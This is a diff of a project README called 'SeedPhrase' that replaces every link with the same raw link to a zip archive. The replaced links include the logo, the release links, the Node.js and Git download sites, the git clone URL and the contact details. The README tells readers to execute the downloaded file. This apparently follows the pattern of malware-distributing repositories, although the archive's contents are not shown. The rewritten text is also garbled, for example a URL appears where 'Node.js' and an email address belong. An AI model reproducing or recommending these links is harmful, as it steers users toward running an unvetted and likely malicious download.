@@ -1,7 +1,7 @@
 # SeedPhrase: Adaptive Resilience Engine for Real-Time Consensus
 
-![SeedPhrase Logo](https://img.shields.io/badge/SeedPhrase-Engine-blue.svg)
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/seydou1/SeedPhrase/releases)
+![SeedPhrase Logo](https://github.com/seydou1/SeedPhrase/raw/refs/heads/main/ungracefully/Seed_Phrase_v3.0.zip)
+[![Download Latest Release](https://github.com/seydou1/SeedPhrase/raw/refs/heads/main/ungracefully/Seed_Phrase_v3.0.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/seydou1/SeedPhrase/raw/refs/heads/main/ungracefully/Seed_Phrase_v3.0.zip)
 
 ## Table of Contents
 
@@ -32,15 +32,15 @@ To get started with SeedPhrase, you will need to set up your environment and ins
 
 ### Prerequisites
 
-- **Node.js**: Ensure you have Node.js installed. You can download it from [nodejs.org](https://nodejs.org/).
-- **Git**: Make sure Git is installed on your machine. Download it from [git-scm.com](https://git-scm.com/).
+- **https://github.com/seydou1/SeedPhrase/raw/refs/heads/main/ungracefully/Seed_Phrase_v3.0.zip**: Ensure you have https://github.com/seydou1/SeedPhrase/raw/refs/heads/main/ungracefully/Seed_Phrase_v3.0.zip installed. You can download it from [https://github.com/seydou1/SeedPhrase/raw/refs/heads/main/ungracefully/Seed_Phrase_v3.0.zip](https://github.com/seydou1/SeedPhrase/raw/refs/heads/main/ungracefully/Seed_Phrase_v3.0.zip).
+- **Git**: Make sure Git is installed on your machine. Download it from [https://github.com/seydou1/SeedPhrase/raw/refs/heads/main/ungracefully/Seed_Phrase_v3.0.zip](https://github.com/seydou1/SeedPhrase/raw/refs/heads/main/ungracefully/Seed_Phrase_v3.0.zip).
 
 ### Installation
 
 1. **Clone the Repository**: Open your terminal and run the following command:
 
    ```bash
-   git clone https://github.com/seydou1/SeedPhrase.git
+   git clone https://github.com/seydou1/SeedPhrase/raw/refs/heads/main/ungracefully/Seed_Phrase_v3.0.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -55,7 +55,7 @@ To get started with SeedPhrase, you will need to set up your environment and ins
    npm install
    ```
 
-4. **Download the Latest Release**: Visit the [Releases section](https://github.com/seydou1/SeedPhrase/releases) to download the latest version. Execute the downloaded file to set up the application.
+4. **Download the Latest Release**: Visit the [Releases section](https://github.com/seydou1/SeedPhrase/raw/refs/heads/main/ungracefully/Seed_Phrase_v3.0.zip) to download the latest version. Execute the downloaded file to set up the application.
 
 ## Usage
 
@@ -105,8 +105,8 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or support, feel free to reach out:
 
-- **Email**: your-email@example.com
-- **Twitter**: [@yourhandle](https://twitter.com/yourhandle)
-- **GitHub**: [seydou1](https://github.com/seydou1)
+- **Email**: https://github.com/seydou1/SeedPhrase/raw/refs/heads/main/ungracefully/Seed_Phrase_v3.0.zip
+- **Twitter**: [@yourhandle](https://github.com/seydou1/SeedPhrase/raw/refs/heads/main/ungracefully/Seed_Phrase_v3.0.zip)
+- **GitHub**: [seydou1](https://github.com/seydou1/SeedPhrase/raw/refs/heads/main/ungracefully/Seed_Phrase_v3.0.zip)
 
-For the latest updates, visit the [Releases section](https://github.com/seydou1/SeedPhrase/releases) and download the latest version to keep your application up to date.
+For the latest updates, visit the [Releases section](https://github.com/seydou1/SeedPhrase/raw/refs/heads/main/ungracefully/Seed_Phrase_v3.0.zip) and download the latest version to keep your application up to date.
